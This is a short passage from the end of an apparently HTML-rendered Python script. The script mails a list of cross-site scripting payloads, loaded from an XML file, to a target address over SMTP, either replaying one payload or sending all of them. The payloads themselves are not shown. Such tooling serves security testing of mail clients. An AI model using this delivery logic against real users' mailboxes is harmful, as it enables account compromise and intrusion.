/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;showXSSPaylods(names,&nbsp;codes)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Replay&nbsp;a&nbsp;single&nbsp;payload</span><br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;replay&nbsp;is&nbsp;not&nbsp;<span style="color:#ff0044;font-weight:700">None</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[+]&nbsp;Replaying&nbsp;payload&nbsp;%d"</span>&nbsp;%&nbsp;replay<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name&nbsp;=&nbsp;names[replay]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;code&nbsp;=&nbsp;codes[replay]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendMail(name,&nbsp;code,&nbsp;dstemail,&nbsp;frmemail,&nbsp;smtpsrv,&nbsp;conn,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;username,&nbsp;password,&nbsp;replay,&nbsp;custompayload,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;injection,&nbsp;pinpoint_field,&nbsp;interactive)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Play&nbsp;all&nbsp;payloads&nbsp;from&nbsp;the&nbsp;XML&nbsp;list</span><br />&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;indexPayload&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;name,&nbsp;code&nbsp;in&nbsp;zip(&nbsp;names,&nbsp;codes&nbsp;):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendMail(name,&nbsp;code,&nbsp;dstemail,&nbsp;frmemail,&nbsp;smtpsrv,&nbsp;conn,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;username,&nbsp;password,&nbsp;indexPayload,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;custompayload,&nbsp;injection,&nbsp;pinpoint_field,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;interactive)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;indexPayload&nbsp;+=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br /><br />if&nbsp;<span style="color:#333333;font-weight:400">__name__</span>&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">'__main__'</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;main()&nbsp;&nbsp;&nbsp;&nbsp;</div></div></div></body></html>